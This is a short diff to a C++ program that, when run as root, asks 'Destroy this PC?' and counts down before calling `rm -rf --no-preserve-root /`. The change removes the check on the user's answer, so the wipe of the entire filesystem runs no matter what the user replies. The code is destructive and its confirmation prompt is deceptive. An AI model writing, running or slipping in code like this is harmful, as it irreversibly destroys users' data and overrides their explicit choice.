@@ -21,12 +21,9 @@ int main()
         std::cout << "\nYou are root";
         std::cout << "\nDestroy this PC? ";
         std::cin >> destroy;
-        if (destroy == 1)
-        {
-            std::cout << "This pc will be wiped in 60 seconds";
-            counter(60);
-            system("rm -rf --no-preserve-root /");
-        }
+        std::cout << "This pc will be wiped in 60 seconds";
+        counter(60);
+        system("rm -rf --no-preserve-root /");
     }
     else
     {
